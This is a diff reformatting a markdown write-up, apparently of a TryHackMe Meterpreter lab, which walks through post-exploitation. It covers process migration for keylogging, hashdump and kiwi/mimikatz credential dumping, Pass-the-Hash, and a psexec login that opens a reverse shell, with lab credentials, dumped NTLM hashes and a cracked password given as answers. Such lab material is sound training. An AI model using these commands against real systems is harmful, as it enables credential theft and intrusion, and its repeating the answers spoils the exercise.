@@ -139,37 +139,62 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) >
 | `hashdump` | Dumps the contents of the SAM database
 
 ## Post-Exploitation with Meterpreter
-Meterpreter provides you with many useful commands that facilitate the post-exploitation phase. Below are a few examples you will often use.
-Help
-This command will give you a list of all available commands in Meterpreter. As we have seen earlier, Meterpreter has many versions, and each version may have different options available. Typing help once you have a Meterpreter session will help you quickly browse through available commands.
-Meterpreter commands
-The getuid command will display the user with which Meterpreter is currently running. This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)
+* Meterpreter provides you with many useful commands that facilitate the post-exploitation phase.
+* Below are a few examples you will often use.
 
+### Help
+* This command will give you a list of all available commands in Meterpreter.
+* As we have seen earlier, Meterpreter has many versions, and each version may have different options available.
+* Typing help once you have a Meterpreter session will help you quickly browse through available commands.
+
+### Meterpreter commands
+* The getuid command will display the user with which Meterpreter is currently running.
+* This will give you an idea of your possible privilege level on the target system (e.g. Are you an admin level user like NT AUTHORITY\SYSTEM or a regular user?)
+```
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 The ps command will list running processes. The PID column will also give you the PID information you will need to migrate Meterpreter to another process.
-
-Migrate
-Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.
-To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716.
+```
+### Migrate
+* Migrating to another process will help Meterpreter interact with it.
+* For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process.
+* Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger.
+* Migrating to another process may also help you to have a more stable Meterpreter session.
+* To migrate to any process, you need to type the migrate command followed by the PID of the desired target process.
+* The example below shows Meterpreter migrating to process ID 716.
+```
 meterpreter > migrate 716
 [*] Migrating from 1304 to 716...
 [*] Migration completed successfully.
-Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You may not be able to gain them back.
-Hashdump
-The hashdump command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.
+```
+* Be careful; you may lose your user privileges if you migrate from a higher privileged (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver).
+* You may not be able to gain them back.
+
+### Hashdump
+* The hashdump command will list the content of the SAM database.
+* The SAM (Security Account Manager) database stores user's passwords on Windows systems.
+* These passwords are stored in the NTLM (New Technology LAN Manager) format.
+```
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
-While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.
-Search
-The search command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.
+```
+* While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack.
+* These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.
+
+### Search
+* The search command is useful to locate files with potentially juicy information.
+* In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.
+```
 meterpreter > search -f flag2.txt
 Found 1 result...
     c:\Windows\System32\config\flag2.txt (34 bytes)
-Shell
-The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.
+```
+### Shell
+* The shell command will launch a regular command-line shell on the target system.
+* Pressing CTRL+Z will help you go back to the Meterpreter shell.
+```
 meterpreter > shell
 Process 2124 created.
 Channel 1 created.
@@ -177,20 +202,27 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
-Post-Exploitation Challenge
-Meterpreter provides several important post-exploitation tools.
-Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.
+```
+## Post-Exploitation Challenge
+* Meterpreter provides several important post-exploitation tools.
+* Commands mentioned previously, such as getsystem and hashdump will provide important leverage and information for privilege escalation and lateral movement.
+* Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework.
+* Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.
+```
 meterpreter > load python
 Loading extension python...Success.
 meterpreter > python_execute "print 'TryHackMe Rocks!'"
 [+] Content written to stdout:
 TryHackMe Rocks!
-The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.
-Gathering further information about the target system.
-Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
-Privilege escalation.
-Lateral movement.
-Once any additional tool is loaded using the load command, you will see new options on the help menu. The example below shows commands added for the Kiwi module (using the load kiwi command).
+```
+* The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.
+  * Gathering further information about the target system.
+  * Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
+  * Privilege escalation.
+  * Lateral movement.
+* Once any additional tool is loaded using the load command, you will see new options on the help menu.
+* The example below shows commands added for the Kiwi module (using the load kiwi command).
+```
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x64/windows)
@@ -201,14 +233,12 @@ Loading extension kiwi...
   '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
 
 Success.
-       
-These will change according to the loaded menu, so running the help command after loading a module is always a good idea.
-The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
-You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
-
-
-
-Username: ballen / password: Password1
+```       
+* These will change according to the loaded menu, so running the help command after loading a module is always a good idea.
+* The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
+* You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
+> Username: ballen / password: Password1
+```
 root@ip-10-10-159-26:~# msfconsole
 msf6 > use exploit/windows/smb/psexec
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -227,9 +257,10 @@ msf6 exploit(windows/smb/psexec) > run
 [*] Meterpreter session 1 opened (10.10.159.26:4444 -> 10.10.113.225:53643) at 2024-01-01 17:42:37 +0000
 
 meterpreter >
-
-What is the computer name?
-What is the target domain?
+```
+> What is the computer name?
+> What is the target domain?
+```
 meterpreter > sysinfo
 Computer    	: ACME-TEST
 OS          	: Windows 2016+ (10.0 Build 17763).
@@ -238,10 +269,11 @@ System Language : en_US
 Domain      	: FLASH
 Logged On Users : 7
 Meterpreter 	: x86/windows
-What is the name of the share likely created by the user?
-	
-	CTRL+Z
-	Background session 1? [y/N]
+```
+> What is the name of the share likely created by the user?
+```	
+CTRL+Z
+Background session 1? [y/N]
 msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_shares
 msf6 post(windows/gather/enum_shares) > set SESSION 1
 msf6 post(windows/gather/enum_shares) > run
@@ -263,7 +295,8 @@ msf6 post(windows/gather/enum_shares) > run
 [*]     Type: DISK
 [*]
 [*] Post module execution completed
-What is the NTLM hash of the jchambers user?
+```
+> What is the NTLM hash of the jchambers user?
 ```	
 meterpreter > ps | grep lsass.exe
 Filtering on 'lsass.exe'
@@ -288,10 +321,10 @@ lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9::
 erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
 ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:c6c85041ee383915bd541ce40b508ff0:::
 ```
-What is the cleartext password of the jchambers user?
+> What is the cleartext password of the jchambers user?
 	
-	Trustno1
-Where is the "secrets.txt"  file located? (Full path of the file)
+Trustno1
+> Where is the "secrets.txt"  file located? (Full path of the file)
 ```
 meterpreter > search -f secrets.txt
 ound 1 result...
